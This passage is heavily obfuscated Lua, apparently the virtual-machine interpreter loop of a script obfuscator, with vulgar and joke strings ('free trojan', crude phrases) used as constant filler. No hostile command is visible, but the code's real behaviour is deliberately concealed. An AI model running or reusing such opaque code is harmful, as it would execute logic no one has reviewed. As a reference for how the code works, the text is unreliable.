cum]]+(0x108f-2135)))do local a=e[t];local r=e[_];local d=a+2 local a={l[a](l[a+1],l[d])};for e=1,r do l[d+e]=a[e];end;local a=a[1]if a then l[d]=a o=e[f];else o=o+n;end;break end;break;end while 3381==(a)/((0x4f3b2/115))do a=(1658452)while i<=(-0x65+116)do a-= a l[e[w]]=l[e[f]][e[C]];break;end while 1972==(a)/((-#"test123"+(152640/0xb4)))do a=(11538648)while(-#"187 ist die gang"+(96-0x40))<i do a-= a l[e[c]]();break end while(a)/((-0x42+3494))==3366 do local e={e,l};e[M][e[h][x]]=e[M][e[n][U]]+e[h][_];break end;break;end break;end break;end break;end break;end while(a)/((-#'amena jumping'+(318083/0xb3)))==92 do a=(364572)while(-#"amena jumping"+(0x92-107))>=i do a-= a a=(3615150)while i<=(154-0x85)do a-= a a=(12425280)while i<=(0x616/82)do a-= a a=(3546756)while(0x10aa/237)<i do a-= a local e=e[c]l[e]=l[e](l[e+h])break end while 2374==(a)/((0x650+-122))do local i;local a;a=e[t];i=l[e[g]];l[a+1]=i;l[a]=i[e[D]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];l[e[x]]=(e[b]~=0);o=o+n;e=d[o];a=e[c]l[a](u(l,a+h,e[k]))o=o+n;e=d[o];do return end;break end;break;end while(a)/((3416+-0x38))==3698 do a=(2303286)while(0x974/121)<i do a-= a l[e[t]][e[g]]=l[e[D]];break end while 618==(a)/((-#"This is working now"+(-0x37+3801)))do if(l[e[x]]~=e[p])then o=o+h;else o=e[b];end;break end;break;end break;end while(a)/((-#"187 ist die gang"+((-#'I like gargling cum'+(1055095-0x80cf3))/239)))==1650 do a=(2063120)while i<=(-65+0x58)do a-= a a=(673440)while i>(-0x65+123)do a-= a local i;local a;a=e[r]l[a](u(l,a+h,e[f]))o=o+n;e=d[o];a=e[c];i=l[e[k]];l[a+1]=i;l[a]=i[e[m]];o=o+n;e=d[o];l[e[x]]=e[b];o=o+n;e=d[o];l[e[r]]=l[e[O]];o=o+n;e=d[o];a=e[w]l[a](u(l,a+h,e[f]))o=o+n;e=d[o];l[e[B]]=s[e[k]];break end while(a)/((-58+0x7da))==345 do local i;local a;l[e[w]]=s[e[f]];o=o+n;e=d[o];a=e[x];i=l[e[f]];l[a+1]=i;l[a]=i[e[_]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[w]]=l[e[U]][e[C]];o=o+n;e=d[o];l[e[t]]={};o=o+n;e=d[o];a=e[c];i=l[e[O]];l[a+1]=i;l[a]=i[e[C]];o=o+n;e=d[o];a=e[w]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[x]][e[O]]=l[e[m]];o=o+n;e=d[o];l[e[x]][e[U]]=e[C];break end;break;end while(a)/((0x3827a/165))==1480 do a=(3496248)while(108-0x54)>=i do a-= a l[e[r]]=(e[U]~=0);o=o+h;break;end while(a)/(((0x7fd-1043)+-#"free trojan"))==3528 do a=(7196826)while(3975/0x9f)<i do a-= a local e=e[x]local d,o=j(l[e](l[e+h]))N=o+e-n local o=0;for e=e,N do o=o+n;l[e]=d[o];end;break end while(a)/((-#'free trojan'+(1957+-0x23)))==3766 do local e=e[r]l[e](u(l,e+h,N))break end;break;end break;end break;end break;end while(a)/((393-0xe5))==2223 do a=(1598314)while i<=(0xe88/124)do a-= a a=(13636260)while i<=(0x57-59)do a-= a a=(9614094)while(61+-0x22)<i do a-= a local a;local i;local U,S;local M;local a;l[e[t]]=l[e[k]][e[_]];o=o+n;e=d[o];l[e[c]]=e[k];o=o+n;e=d[o];l[e[c]]=l[e[k]];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[t]]=l[e[f]][e[D]];o=o+n;e=d[o];l[e[B]][e[g]]=l[e[_]];o=o+n;e=d[o];l[e[w]]=s[e[k]];o=o+n;e=d[o];a=e[r];M=l[e[O]];l[a+1]=M;l[a]=M[e[C]];o=o+n;e=d[o];a=e[w]U,S=j(l[a](l[a+h]))N=S+a-n i=0;for e=a,N do i=i+n;l[e]=U[i];end;o=o+n;e=d[o];a=e[B]U={l[a](u(l,a+1,N))};i=0;for e=a,e[P]do i=i+n;l[e]=U[i];end break end while 2597==(a)/((-46+0xea4))do local i;local a;l[e[t]]=s[e[U]];o=o+n;e=d[o];l[e[w]]=l[e[g]][e[m]];o=o+n;e=d[o];l[e[w]]=l[e[O]][e[_]];o=o+n;e=d[o];a=e[B];i=l[e[k]];l[a+1]=i;l[a]=i[e[m]];o=o+n;e=d[o];a=e[r]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[x]]=l[e[b]][e[P]];o=o+n;e=d[o];l[e[B]][e[b]]=l[e[_]];o=o+n;e=d[o];do return end;break end;break;end while(a)/((-#"amena jumping"+(7035-0xdca)))==3905 do a=(7148610)while(-#[[I like gargling cum]]+(-33+0x51))<i do a-= a local C;local i;local a;l[e[c]]=S[e[g]];o=o+n;e=d[o];l[e[r]]=S[e[f]];o=o+n;e=d[o];l[e[w]]=l[e[b]][e[D]];o=o+n;e=d[o];l[e[t]]=s[e[U]];o=o+n;e=d[o];l[e[w]]=l[e[k]][e[p]];o=o+n;e=d[o];l[e[t]]=e[f];o=o+n;e=d[o];l[e[w]]=e[g];o=o+n;e=d[o];l[e[x]]=e[k];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];i={l,e};i[h][i[M][r]]=i[n][i[M][P]]+i[h][i[M][f]];o=o+n;e=d[o];l[e[x]][e[O]]=l[e[m]];o=o+n;e=d[o];l[e[B]]=S[e[g]];o=o+n;e=d[o];l[e[r]][e[O]]=e[_];o=o+n;e=d[o];l[e[r]]=S[e[O]];o=o+n;e=d[o];a=e[w];C=l[e[U]];l[a+1]=C;l[a]=C[e[P]];o=o+n;e=d[o];l[e[c]]=S[e[g]];o=o+n;e=d[o];l[e[B]]=l[e[g]][e[m]];o=o+n;e=d[o];l[e[w]]=s[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[D]];o=o+n;e=d[o];l[e[x]]=e[U];o=o+n;e=d[o];l[e[B]]=e[U];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];l[e[r]]=e[O];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];i={l,e};i[h][i[M][t]]=i[n][i[M][P]]+i[h][i[M][O]];o=o+n;e=d[o];a=e[B]l[a](u(l,a+h,e[b]))o=o+n;e=d[o];do return end;break end while(a)/((-#"Bong"+(2245+(-#[[test123]]+(-0x2e+17)))))==3242 do local a;l[e[B]]=l[e[g]][e[P]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];a=e[t]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[w]]=s[e[f]];o=o+n;e=d[o];l[e[c]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[x]]=e[b];o=o+n;e=d[o];l[e[B]]=l[e[g]];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];l[e[B]][e[k]]=l[e[C]];o=o+n;e=d[o];l[e[t]][e[b]]=e[_];break end;break;end break;end while(a)/((0x13cb-2546))==634 do a=(457164)while i<=((161+-0x79)+-#'test 123')do a-= a a=(9410663)while i>(-0x3f+94)do a-= a l[e[x]][e[k]]=e[p];break end while 2609==(a)/(((912623+-0x34)/253))do if(l[e[c]]==l[e[D]])then o=o+h;else o=e[O];end;break end;break;end while(a)/((0x42e-572))==918 do a=(76431)while(0x20df/(-#'free trojan'+(-95+0x169)))>=i do a-= a l[e[r]]=(e[U]~=0);o=o+h;break;end while(a)/(((26448/0x72)+-#'amena jumping'))==349 do a=(1189632)while i>(0xbb0/88)do a-= a local a;local r;local i,b;local x;local a;a=e[c]l[a](l[a+h])o=o+n;e=d[o];l[e[B]]=s[e[O]];o=o+n;e=d[o];l[e[B]]();o=o+n;e=d[o];l[e[B]]=s[e[O]];o=o+n;e=d[o];a=e[w];x=l[e[O]];l[a+1]=x;l[a]=x[e[D]];o=o+n;e=d[o];a=e[c]i,b=j(l[a](l[a+h]))N=b+a-n r=0;for e=a,N do r=r+n;l[e]=i[r];end;o=o+n;e=d[o];a=e[w]i={l[a](u(l,a+1,N))};r=0;for e=a,e[C]do r=r+n;l[e]=i[r];end o=o+n;e=d[o];o=e[U];break end while 1549==(a)/(((0x807300/113)/0x61))do l[e[B]]=l[e[g]][l[e[m]]];break end;break;end break;end break;end break;end break;end break;end while(a)/((1612/0x2))==505 do a=(2178264)while(-#[[187 ist die gang]]+(((0x51f0/138)+-#"I like gargling cum")+-0x40))>=i do a-= a a=(1206570)while i<=(0xad-129)do a-= a a=(55680)while(6669/0xab)>=i do a-= a a=(9037816)while i<=(0x43+-30)do a-= a a=(12237720)while((-78+0x7f)+-#"me big peepee")<i do a-= a l[e[r]]=S[e[b]];break end while(a)/((6177-0xc39))==4015 do l[e[r]]=#l[e[O]];break end;break;end while 3662==(a)/((-#[[amena jumping]]+(0x1387-2518)))do a=(7573974)while(-#[[This is working now]]+(129+-0x48))<i do a-= a local a;l[e[t]]=l[e[k]][e[C]];o=o+n;e=d[o];l[e[x]]=l[e[k]];o=o+n;e=d[o];l[e[w]]=l[e[f]][e[_]];o=o+n;e=d[o];a=e[r]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];if not l[e[x]]then o=o+h;else o=e[f];end;break end while(a)/((8168-((4213+-0x3e)+-#'187 ist die gang')))==1878 do do return end;break end;break;end break;end while(a)/(((((3713920/0x8c)+-#'test')/0x13)+-#'Bong'))==40 do a=(13122140)while i<=((-#'me big peepee'+(-95+-0x10))+165)do a-= a a=(2960150)while i>(-#"187 ist die gang"+(2576/0x2e))do a-= a local i;local a;l[e[r]]=S[e[O]];o=o+n;e=d[o];a=e[t];i=l[e[b]];l[a+1]=i;l[a]=i[e[C]];o=o+n;e=d[o];a=e[r]l[a](l[a+h])o=o+n;e=d[o];l[e[r]]=S[e[k]];o=o+n;e=d[o];a=e[t];i=l[e[f]];l[a+1]=i;l[a]=i[e[p]];o=o+n;e=d[o];l[e[r]]=e[O];o=o+n;e=d[o];l[e[c]]=(e[U]~=0);o=o+n;e=d[o];a=e[r]l[a](u(l,a+h,e[U]))o=o+n;e=d[o];l[e[t]]=S[e[g]];o=o+n;e=d[o];l[e[c]]=S[e[k]];o=o+n;e=d[o];l[e[t]][e[b]]=l[e[_]];o=o+n;e=d[o];l[e[c]]=s[e[b]];o=o+n;e=d[o];l[e[r]]();o=o+n;e=d[o];l[e[t]]=S[e[b]];o=o+n;e=d[o];l[e[t]]=S[e[O]];o=o+n;e=d[o];l[e[t]][e[U]]=l[e[C]];o=o+n;e=d[o];do return end;break end while 3650==(a)/((-#[[I like gargling cum]]+(0x10360/80)))do do return l[e[t]]end break end;break;end while(a)/(((0x922d4/170)+-#[[test]]))==3730 do a=(1352049)while(-31+0x49)>=i do a-= a do return end;break;end while(a)/((276877/0x89))==669 do a=(760725)while(161-0x76)<i do a-= a if(l[e[c]]~=e[D])then o=o+h;else o=e[O];end;break end while 675==(a)/((22540/0x14))do local r;local a;l[e[t]][e[b]]=e[_];o=o+n;e=d[o];l[e[c]][e[U]]=e[_];o=o+n;e=d[o];l[e[x]][e[g]]=e[p];o=o+n;e=d[o];l[e[B]][e[b]]=e[C];o=o+n;e=d[o];l[e[x]]=s[e[O]];o=o+n;e=d[o];l[e[w]][e[g]]=l[e[D]];o=o+n;e=d[o];a=e[t];r=l[e[f]];l[a+1]=r;l[a]=r[e[_]];o=o+n;e=d[o];a=e[x]l[a](l[a+h])o=o+n;e=d[o];l[e[w]][e[k]]=l[e[_]];break end;break;end break;end break;end break;end while 1110==(a)/((-0x79+1208))do a=(3399473)while i<=((12127/((206+-0x15)+-#'Bong'))+-#[[I like gargling cum]])do a-= a a=(3174451)while(146-0x64)>=i do a-= a a=(818565)while i>(192-0x93)do a-= a local o=e[B];local n=l[e[f]];l[o+1]=n;l[o]=n[e[P]];break end while 1353==(a)/(((0x524-(0x599-731))+-#'no thanks'))do local i;local a;a=e[c];i=l[e[U]];l[a+1]=i;l[a]=i[e[C]];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[B]]=l[e[O]][e[C]];o=o+n;e=d[o];l[e[x]][e[g]]=l[e[D]];o=o+n;e=d[o];l[e[c]]=l[e[b]][e[_]];o=o+n;e=d[o];a=e[t];i=l[e[g]];l[a+1]=i;l[a]=i[e[m]];break end;break;end while 3983==(a)/((0x2494c/188))do a=(4615056)while(-#[[test123]]+(0xa2-108))<i do a-= a local i;local a;l[e[t]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[w]]=e[O];o=o+n;e=d[o];l[e[x]]=e[O];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];l[e[w]]=e[O];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[B]][e[k]]=l[e[P]];o=o+n;e=d[o];l[e[r]]=s[e[k]];o=o+n;e=d[o];l[e[B]]=l[e[U]][e[P]];o=o+n;e=d[o];l[e[x]]=e[g];o=o+n;e=d[o];a=e[c]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[B]]=s[e[k]];o=o+n;e=d[o];l[e[x]]=l[e[b]][e[_]];o=o+n;e=d[o];l[e[t]]=e[k];o=o+n;e=d[o];l[e[c]]=e[b];o=o+n;e=d[o];l[e[t]]=e[f];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[r]][e[b]]=l[e[_]];o=o+n;e=d[o];l[e[c]]=s[e[O]];o=o+n;e=d[o];l[e[B]]=l[e[f]][e[m]];o=o+n;e=d[o];l[e[c]]=e[b];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[r]][e[k]]=l[e[m]];o=o+n;e=d[o];l[e[c]][e[b]]=e[m];o=o+n;e=d[o];a=e[t];i=l[e[U]];l[a+1]=i;l[a]=i[e[p]];o=o+n;e=d[o];a=e[r]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[x]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[O]][e[D]];o=o+n;e=d[o];l[e[t]]=e[k];o=o+n;e=d[o];l[e[w]]=l[e[k]];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[B]][e[b]]=e[m];o=o+n;e=d[o];l[e[B]][e[O]]=e[P];o=o+n;e=d[o];l[e[w]][e[b]]=e[P];o=o+n;e=d[o];l[e[r]][e[O]]=e[C];o=o+n;e=d[o];l[e[c]][e[b]]=e[P];o=o+n;e=d[o];l[e[B]]=S[e[O]];o=o+n;e=d[o];l[e[c]][e[b]]=l[e[C]];o=o+n;e=d[o];l[e[c]]=s[e[U]];o=o+n;e=d[o];l[e[B]]=l[e[U]][e[P]];o=o+n;e=d[o];l[e[t]]=e[O];o=o+n;e=d[o];l[e[B]]=l[e[U]];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[w]][e[g]]=e[p];o=o+n;e=d[o];l[e[w]][e[b]]=e[C];o=o+n;e=d[o];l[e[t]][e[U]]=e[P];o=o+n;e=d[o];l[e[r]][e[b]]=e[_];o=o+n;e=d[o];l[e[x]][e[O]]=e[P];o=o+n;e=d[o];l[e[r]][e[U]]=e[C];o=o+n;e=d[o];l[e[x]][e[U]]=l[e[_]];o=o+n;e=d[o];l[e[r]][e[O]]=l[e[D]];o=o+n;e=d[o];l[e[x]][e[g]]=l[e[D]];o=o+n;e=d[o];l[e[t]][e[k]]=l[e[P]];o=o+n;e=d[o];l[e[t]][e[O]]=l[e[C]];o=o+n;e=d[o];l[e[r]][e[b]]=l[e[_]];o=o+n;e=d[o];l[e[x]]=s[e[k]];break end while 1296==(a)/((295563/0x53))do local i;local t,b;local a;a=e[c]t,b=j(l[a](l[a+h]))N=b+a-n i=0;for e=a,N do i=i+n;l[e]=t[i];end;o=o+n;e=d[o];a=e[c]l[a](u(l,a+h,N))o=o+n;e=d[o];l[e[r]]=s[e[g]];o=o+n;e=d[o];l[e[x]]=e[k];o=o+n;e=d[o];a=e[c]l[a](l[a+h])o=o+n;e=d[o];l[e[c]]=s[e[f]];o=o+n;e=d[o];l[e[w]]=l[e[g]][e[p]];o=o+n;e=d[o];l[e[x]]=s[e[k]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[P]];break end;break;end break;end while(a)/((0x48c53/79))==901 do a=(3681960)while i<=(0x96/3)do a-= a a=(149550)while i>(-#'This is working now'+(100+-0x20))do a-= a l[e[c]]=e[b];break end while(a)/((0xb2+-28))==997 do local a;local i;local c,w;local b;local a;l[e[B]]=s[e[U]];o=o+n;e=d[o];a=e[x];b=l[e[k]];l[a+1]=b;l[a]=b[e[C]];o=o+n;e=d[o];a=e[B]c,w=j(l[a](l[a+h]))N=w+a-n i=0;for e=a,N do i=i+n;l[e]=c[i];end;o=o+n;e=d[o];a=e[r]c={l[a](u(l,a+1,N))};i=0;for e=a,e[_]do i=i+n;l[e]=c[i];end o=o+n;e=d[o];o=e[k];break end;break;end while 1509==(a)/((0x1358-2512))do a=(6769840)while((0x2066/143)+-#"test123")>=i do a-= a local C;local i;local a;l[e[c]]=S[e[k]];o=o+n;e=d[o];l[e[x]]=S[e[f]];o=o+n;e=d[o];l[e[w]]=l[e[O]][e[m]];o=o+n;e=d[o];l[e[x]]=s[e[g]];o=o+n;e=d[o];l[e[r]]=l[e[O]][e[D]];o=o+n;e=d[o];l[e[t]]=e[g];o=o+n;e=d[o];l[e[x]]=e[k];o=o+n;e=d[o];l[e[B]]=e[O];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];i={l,e};i[h][i[M][B]]=i[n][i[M][P]]+i[h][i[M][f]];o=o+n;e=d[o];l[e[t]][e[O]]=l[e[p]];o=o+n;e=d[o];l[e[w]]=S[e[f]];o=o+n;e=d[o];l[e[c]][e[U]]=e[_];o=o+n;e=d[o];l[e[t]]=S[e[U]];o=o+n;e=d[o];a=e[w];C=l[e[O]];l[a+1]=C;l[a]=C[e[D]];o=o+n;e=d[o];l[e[t]]=S[e[k]];o=o+n;e=d[o];l[e[r]]=l[e[f]][e[P]];o=o+n;e=d[o];l[e[t]]=s[e[f]];o=o+n;e=d[o];l[e[c]]=l[e[g]][e[_]];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];l[e[c]]=e[O];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[U]))o=o+n;e=d[o];i={l,e};i[h][i[M][t]]=i[n][i[M][_]]+i[h][i[M][k]];o=o+n;e=d[o];a=e[x]l[a](u(l,a+h,e[k]))o=o+n;e=d[o];do return end;break;end while(a)/((0x13cf-2559))==2695 do a=(1898844)while i>(0x59+-37)do a-= a local a;local i;local k,t;local c;local a;a=e[r];c=l[e[O]];l[a+1]=c;l[a]=c[e[C]];o=o+n;e=d[o];a=e[w]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[r]]=s[e[b]];o=o+n;e=d[o];a=e[B];c=l[e[f]];l[a+1]=c;l[a]=c[e[C]];o=o+n;e=d[o];a=e[r]k,t=j(l[a](l[a+h]))N=t+a-n i=0;for e=a,N do i=i+n;l[e]=k[i];end;o=o+n;e=d[o];a=e[x]k={l[a](u(l,a+1,N))};i=0;for e=a,e[p]do i=i+n;l[e]=k[i];end o=o+n;e=d[o];o=e[U];break end while(a)/((-0x40+4070))==474 do local n=e[r];local d=l[n]local a=l[n+2];if(a>0)then if(d>l[n+1])then o=e[O];else l[n+3]=d;end elseif(d<l[n+1])then o=e[O];else l[n+3]=d;end break end;break;end break;end break;end break;end break;end while 2676==(a)/(((-76+0x385)+-#'free trojan'))do a=(2359179)while i<=((0xb2-112)+-#'test')do a-= a a=(15898820)while i<=((149-(-#[[no thanks]]+(-0x1c+120)))+-#'no thanks')do a-= a a=(8351424)while i<=((0xab3e7/109)/117)do a-= a a=(5349835)while((0xcf-145)+-#"test 123")<i do a-= a local e=e[B]l[e](u(l,e+h,N))break end while 2245==(a)/(((0x63916/170)+-#"187 ist die gang"))do l[e[w]]=l[e[O]]-l[e[m]];break end;break;end while 2864==(a)/((0xbce+-106))do a=(6151080)while i>(-#"test 123"+(0xc0-128))do a-= a l[e[c]]=s[e[U]];break end while 1560==(a)/((0x1ef0-3977))do l[e[w]]=l[e[U]][e[m]];o=o+n;e=d[o];l[e[w]][e[O]]=e[C];o=o+n;e=d[o];l[e[x]]=S[e[k]];o=o+n;e=d[o];l[e[c]]=l[e[U]][e[C]];o=o+n;e=d[o];l[e[t]][e[f]]=e[C];o=o+n;e=d[o];l[e[t]]=S[e[b]];o=o+n;e=d[o];l[e[c]]=l[e[U]][e[p]];o=o+n;e=d[o];l[e[w]]=S[e[O]];o=o+n;e=d[o];if(l[e[r]]==l[e[m]])then o=o+h;else o=e[g];end;break end;break;end break;end while 4085==(a)/((7827-0xf5f))do a=(637560)while(-#"This is working now"+(9594/0x7b))>=i do a-= a a=(15524235)while i>(-#'I like gargling cum'+(0x3c75/201))do a-= a l[e[r]][l[e[f]]]=l[e[p]];break end while(a)/((-#"Bong"+(7669-0xf06)))==4065 do local d=e[c]local a={l[d](l[d+1])};local o=0;for e=d,e[_]do o=o+n;l[e]=a[o];end break end;break;end while 552==(a)/(((0x945-1199)+-#[[I like gargling cum]]))do a=(1715889)while i<=(0xd3-(-64+0xd7))do a-= a l[e[t]]=S[e[b]];o=o+n;e=d[o];l[e[r]][e[b]]=e[D];o=o+n;e=d[o];l[e[x]]=S[e[f]];o=o+n;e=d[o];l[e[w]][e[b]]=e[_];o=o+n;e=d[o];do return end;break;end while 707==(a)/((0x49794/124))do a=(3164370)while(232-0xab)<i do a-= a local o=e[x]local a={l[o](u(l,o+1,N))};local d=0;for e=o,e[D]do d=d+n;l[e]=a[d];end break end while 1419==(a)/((-#[[This is working now]]+(0x3d7f0/112)))do l[e[B]]=(e[U]~=0);break end;break;end break;end break;end break;end while(a)/((4058-(0x1039-2096)))==1179 do a=(602943)while(0xc4-130)>=i do a-= a a=(6975607)while i<=(0xcd-141)do a-= a a=(884030)while i>(126+(-0x56+23))do a-= a l[e[w]]=l[e[O]];break end while 2555==(a)/(((392+-0x21)+-#"me big peepee"))do local e=e[t]l[e](l[e+h])break end;break;end while(a)/((392914/0x8e))==2521 do a=(683700)while(197-0x84)<i do a-= a local i;local a;l[e[r]]=l[e[O]][e[_]];o=o+n;e=d[o];l[e[w]]=e[O];o=o+n;e=d[o];l[e[t]]=l[e[g]];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[c]][e[O]]=e[m];o=o+n;e=d[o];l[e[w]][e[b]]=e[p];o=o+n;e=d[o];l[e[x]]=s[e[f]];o=o+n;e=d[o];a=e[w];i=l[e[O]];l[a+1]=i;l[a]=i[e[m]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[O]))break end while(a)/((-88+0x562))==530 do local a;l[e[t]]=s[e[k]];o=o+n;e=d[o];l[e[r]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[t]]=l[e[b]];o=o+n;e=d[o];a=e[x]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[x]]();break end;break;end break;end while(a)/((-0x3d+424))==1661 do a=(2792920)while i<=((-#"amena jumping"+(1639959/0xc7))/0x79)do a-= a a=(46013)while i>(-#"This is working now"+(211-((0x26cd/77)+-#[[Bong]])))do a-= a local a;l[e[r]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[U]][e[P]];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];l[e[r]]=e[g];o=o+n;e=d[o];l[e[t]]=e[U];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];l[e[c]][e[f]]=l[e[m]];break end while 517==(a)/((((0x726d-14692)/157)+-#'Bong'))do l[e[c]]=v(K[e[b]],nil,s);break end;break;end while 820==(a)/((-0x76+(-0x6b+3631)))do a=(580227)while i<=(-0x4a+143)do a-= a o=e[g];break;end while(a)/((0xc72-1605))==367 do a=(12188415)while((0x370b/183)+-#'test123')<i do a-= a local e=e[B]local d,o=j(l[e](l[e+h]))N=o+e-n local o=0;for e=e,N do o=o+n;l[e]=d[o];end;break end while(a)/(((0xcda+(-6050/0x32))+-#'Bong'))==3851 do local P;local i;local t;local a;l[e[r]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[U]][e[m]];o=o+n;e=d[o];a=e[w];t=l[e[f]];l[a+1]=t;l[a]=t[e[C]];o=o+n;e=d[o];l[e[c]]=l[e[k]];o=o+n;e=d[o];l[e[r]]=l[e[g]];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[U]))o=o+n;e=d[o];a=e[c];t=l[e[g]];l[a+1]=t;l[a]=t[e[D]];o=o+n;e=d[o];a=e[c]l[a]=l[a](l[a+h])o=o+n;e=d[o];i={l,e};i[h][i[M][w]]=i[n][i[M][p]]+i[h][i[M][O]];o=o+n;e=d[o];l[e[x]]=l[e[g]]%e[_];o=o+n;e=d[o];a=e[x]l[a]=l[a](l[a+h])o=o+n;e=d[o];t=e[f];P=l[t]for e=t+1,e[p]do P=P..l[e];end;l[e[x]]=P;o=o+n;e=d[o];i={l,e};i[h][i[M][B]]=i[n][i[M][p]]+i[h][i[M][O]];o=o+n;e=d[o];l[e[w]]=l[e[f]]%e[D];break end;break;end break;end break;end break;end break;end break;end break;end while 1689==(a)/((0xf60/4))do a=(1178736)while i<=(273-0xa6)do a-= a a=(2927808)while i<=(2403/0x1b)do a-= a a=(1437255)while i<=(285-0xcd)do a-= a a=(8922151)while i<=(196-0x79)do a-= a a=(2490576)while i<=(-0x62+171)do a-= a a=(1227849)while(0x5a0/20)<i do a-= a if not l[e[x]]then o=o+h;else o=e[k];end;break end while(a)/((0x10efa/70))==1239 do if(l[e[w]]~=l[e[D]])then o=o+h;else o=e[g];end;break end;break;end while 3916==(a)/((-#'test'+(1346-(1539-0x341))))do a=(10761680)while((2542936/0xf2)/142)<i do a-= a l[e[B]]=l[e[k]]%e[p];break end while(a)/((-#[[test123]]+(0x1e9e-3971)))==2788 do l[e[w]]=v(K[e[U]],nil,s);break end;break;end break;end while(a)/((-22+0xfdd))==2209 do a=(3884150)while((-108+0xc4)+-#'free trojan')>=i do a-= a a=(17280)while i>(270-0xc2)do a-= a local e={e,l};e[M][e[h][t]]=e[M][e[n][k]]+e[h][D];break end while 40==(a)/((922-0x1ea))do local n=e[c];local a=l[n+2];local d=l[n]+a;l[n]=d;if(a>0)then if(d<=l[n+1])then o=e[k];l[n+3]=d;end elseif(d>=l[n+1])then o=e[k];l[n+3]=d;end break end;break;end while(a)/((0x98a-(0x36950/178)))==3275 do a=(12014320)while(0x112-196)>=i do a-= a local e=e[t]l[e]=l[e](l[e+h])break;end while(a)/((0x1e0c-3890))==3160 do a=(7959084)while i>(0xcd-126)do a-= a local i;local a;a=e[B];i=l[e[k]];l[a+1]=i;l[a]=i[e[p]];o=o+n;e=d[o];l[e[x]]=e[U];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[c]]=l[e[O]][e[D]];o=o+n;e=d[o];l[e[w]]=s[e[f]];o=o+n;e=d[o];a=e[r];i=l[e[g]];l[a+1]=i;l[a]=i[e[_]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[r]]=s[e[b]];o=o+n;e=d[o];a=e[x];i=l[e[f]];l[a+1]=i;l[a]=i[e[P]];break end while 2311==(a)/((6888/0x2))do local d=e[c];local r=e[_];local a=d+2 local d={l[d](l[d+1],l[a])};for e=1,r do l[a+e]=d[e];end;local d=d[1]if d then l[a]=d o=e[U];else o=o+n;end;break end;break;end break;end break;end break;end while(a)/((-124+0x70d))==855 do a=(5338880)while(-78+0xa2)>=i do a-= a a=(4243770)while(-#[[I like gargling cum]]+(0x11a-181))>=i do a-= a a=(3724679)while i>(0x31ad/(-0x66+259))do a-= a if(l[e[r]]==l[e[C]])then o=o+h;else o=e[g];end;break end while 1379==(a)/(((408908/0x97)+-#[[test123]]))do local a;l[e[c]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[g]][e[D]];o=o+n;e=d[o];l[e[t]]=e[b];o=o+n;e=d[o];a=e[r]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[r]][e[U]]=e[_];break end;break;end while(a)/((0x1e93-3962))==1098 do a=(1654020)while(17098/(445-0xef))<i do a-= a s[e[U]]=l[e[r]];break end while(a)/((3096+-0x21))==540 do l[e[x]]();break end;break;end break;end while 1940==(a)/((0xaff+-63))do a=(2460120)while i<=(-#"test 123"+(142+-0x30))do a-= a 